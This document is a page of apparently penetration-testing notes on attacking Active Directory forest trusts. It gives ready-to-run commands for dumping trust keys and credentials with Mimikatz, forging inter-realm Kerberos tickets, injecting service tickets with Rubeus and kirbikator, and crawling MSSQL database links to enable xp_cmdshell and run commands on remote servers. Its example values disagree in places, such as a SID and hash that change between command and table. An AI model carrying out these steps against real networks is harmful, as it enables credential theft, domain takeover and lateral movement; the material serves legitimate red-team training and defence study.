---
title: Cross Forest Attacks
category: Active Directory
order: 6
---

In this section we are going to abuse trusts between forests.

# Across Forests using Trust Tickets

First we need to retrieved the Trust Key:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

> **Note**: The access we will have will be limited to what our DA account is configured to have on the other Forest!

An **inter-realm TGT** can be forged:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```
* **Invoke-Mimikatz**

|                   **Parameter**                   |                 **Description**                |
|:-------------------------------------------------:|:----------------------------------------------:|
| /domain:sub.corp.local                            | Current Domain FQDN                            |
| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
| /user:Administrator                               | User to impersonate                            |
| /rc4:a9b30e5b0dc865eadcea9411e4ade72d             | krbtgt hash of Current Domain                  |
| /service:krbtgt                                   | krbtgt service to abuse                        |
| /target:extcorp.local                             | Target domain                                  |
| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |



Now we can request a TGS for `cifs` service on the dc of the trusted forest.

* Asktgs.exe (kekeo_old)

```powershell
.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
```

* Rubeus.exe
```powershell
.\Rubeus.exe asktgs /ticket:trust_forest_tkt.kirbi /dc:dc01.extcorp.local /service:CIFS/dc01.extcorp.local
```

And inject the ticket on the current session:

```powershell
.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
```
> **Note**: We can not list all the file system of other forest. We can only list shared folders.

```
ls \\dc01.extcorp.local\share\
```

# Trust Abuse with MSSQL Server

MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles.

A fantastic tool to abuse MSSQL is `PowerUpSQLl`: 

* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
```powershell
Import-Module .\PowerUpSQL.psd1
```

> **Note**: Important! Write `Import-Module` and import which have **PSD1** extension.

We can discover SQL servers:

```powershell
Get-SQLInstanceDomain
```

We can check accessibility:

```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
Gather information:

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## Database Links

A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE.

Database link works even across forest trusts.

```powershell
Get-SQLServerLink -Instance mssql.corp.local -Verbose
```

So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links.

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose
```

> **Note**: Manual way:
>
> See if has a server link:
> `select * from master..sysservers`
>
> Openquery() function can be used to run quieries on a linked database:
> `select * from openquery("CORP-SQL1", 'select * from master..sysservers')`
>
> `select * from openquery("CORP-SQL1", ''select * from openquery("CORP-SQL2", 'master..sysservers'')')`

To execute commands from MSSQL server we need to use `xp_cmdshell`. If `rpcout` is enabled `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "other-sql"
```

And finally:

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query "exec master..xp_cmdshell 'whoami'"
```